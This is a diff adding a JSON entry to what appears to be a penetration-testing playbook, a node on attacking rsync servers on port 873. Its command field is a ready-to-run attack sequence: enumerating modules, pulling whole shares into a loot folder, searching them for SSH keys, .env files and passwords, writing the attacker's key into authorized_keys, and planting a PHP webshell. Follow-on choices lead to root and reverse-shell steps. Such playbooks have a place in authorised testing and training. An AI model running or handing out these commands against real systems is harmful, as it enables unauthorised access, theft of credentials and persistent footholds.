@@ -1,0 +1,26 @@
+{
+  "id": "rsync",
+  "phase": "RECON",
+  "title": "Rsync (873)",
+  "body": "Rsync modules are directory shares. Anonymous read = file loot. Anonymous write = upload SSH keys or webshells. Enumerate modules first.",
+  "cmd": "nmap -p 873 -sV --script rsync-list-modules $ip\nnc -nv $ip 873     # banner grab\n\n# List modules (anonymous)\nrsync rsync://$ip/\nrsync rsync://$ip/<module>/\n\n# Download entire module\nrsync -av rsync://$ip/<module>/ /tmp/rsync_loot/\n\n# With credentials\nrsync -av rsync://user:pass@$ip/<module>/ /tmp/loot/\n\n# Search for useful files\nfind /tmp/rsync_loot -name \"id_rsa\" -o -name \"*.key\" -o -name \".env\"\nfind /tmp/rsync_loot -name \"*.conf\" | xargs grep -i \"pass\\|secret\"\n\n# Upload SSH key (if writable)\nrsync ~/.ssh/id_rsa.pub rsync://$ip/<module>/.ssh/authorized_keys\n\n# Upload webshell (if module under webroot)\nrsync shell.php rsync://$ip/<module>/shell.php",
+  "warn": "Module names are case-sensitive. Try common names: backup, data, files, web, www, home, root.",
+  "choices": [
+    {
+      "label": "Anonymous read — found credentials",
+      "next": "creds_found"
+    },
+    {
+      "label": "Found SSH key in module",
+      "next": "ssh_key"
+    },
+    {
+      "label": "Wrote SSH key — got shell",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Wrote webshell",
+      "next": "reverse_shell"
+    }
+  ]
+}
